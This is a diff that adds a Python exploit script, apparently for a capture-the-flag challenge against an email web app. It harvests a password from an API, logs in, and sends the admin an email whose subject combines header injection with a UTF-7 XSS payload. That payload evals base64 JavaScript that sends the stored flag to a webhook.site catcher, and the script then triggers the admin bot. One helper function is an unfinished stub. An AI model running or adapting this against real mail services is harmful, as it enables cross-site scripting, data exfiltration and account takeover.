@@ -1,0 +1,80 @@
+import requests
+import re
+import time
+import base64
+import random
+from urllib.parse import quote
+
+# ================== CONFIG ==================
+BASE_URL = "http://YOUR_INSTANCE_URL_HERE"   # ← CHANGE THIS
+WEBHOOK_URL = "https://webhook.site/YOUR_WEBHOOK_TOKEN_HERE"  # Change to your catcher
+
+USERNAME = "user@ses"
+PASSWORD = ""   # We'll get it from /api/password
+# ===========================================
+
+s = requests.Session()
+
+def get_credentials():
+    global PASSWORD
+    r = s.get(f"{BASE_URL}/api/password")
+    data = r.json()
+    PASSWORD = data["password"]
+    print(f"[+] Got password: {PASSWORD}")
+
+def login():
+    data = {"username": USERNAME, "password": PASSWORD}
+    r = s.post(f"{BASE_URL}/api/login", json=data)
+    print("[+] Login:", r.text)
+
+def collect_boundaries(n=700):
+    print(f"[+] Collecting {n} boundaries...")
+    boundaries = []
+    for i in range(n):
+        subject = f"boundary_test_{i}"
+        r = s.post(f"{BASE_URL}/api/send", json={
+            "to": USERNAME,
+            "subject": subject,
+            "body": "test"
+        })
+        # Extract boundary from raw email (this part needs adjustment based on how you view emails)
+        # For simplicity, many scripts parse the response or inbox
+        time.sleep(0.3)
+    # Note: Real scripts use a better way to extract boundaries
+    print("[+] Boundary collection done (implement extraction)")
+
+# Simple version - replace with full boundary cracker if needed
+def send_malicious_email():
+    # UTF-7 XSS payload
+    js = f"""fetch("{WEBHOOK_URL}?flag="+btoa(localStorage.getItem("flag")))"""
+    utf7_xss = "+ADw-img+ACA-src+AD0-x+ACA-onerror+AD0-eval(atob('"+base64.b64encode(js.encode()).decode()+"'))+AD4-"
+
+    # Malicious subject with header injection + encoded-word
+    malicious_subject = f"""hi=?utf-8?B?{base64.b64encode(b'\nFrom : admin@ses\n').decode()}?= """
+
+    data = {
+        "to": "admin@ses",
+        "subject": malicious_subject + utf7_xss,
+        "body": "exploit"
+    }
+    r = s.post(f"{BASE_URL}/api/send", json=data)
+    print("[+] Malicious email sent:", r.text)
+
+def trigger_admin_bot():
+    # Try common endpoints
+    try:
+        r = s.post(f"{BASE_URL}/api/admin_bot", json={})
+        print("[+] Bot triggered:", r.text)
+    except:
+        print("[-] Try triggering bot manually in browser")
+
+# ===================== MAIN =====================
+if __name__ == "__main__":
+    if "YOUR_INSTANCE_URL_HERE" in BASE_URL:
+        print("[-] Please set BASE_URL first!")
+    else:
+        get_credentials()
+        login()
+        send_malicious_email()
+        trigger_admin_bot()
+        print("\n[+] Now check your webhook.site / request catcher for the flag!")
